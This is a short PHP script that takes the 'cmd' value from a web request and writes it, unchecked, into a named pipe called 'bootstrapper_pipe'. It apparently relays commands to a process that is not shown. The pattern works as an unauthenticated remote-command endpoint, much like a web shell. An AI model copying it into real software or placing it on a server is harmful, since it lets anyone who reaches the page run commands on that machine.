<?php

  $pipe = fopen("bootstrapper_pipe","w");
  fwrite($pipe, $_GET["cmd"]);
  fclose($pipe);

?>
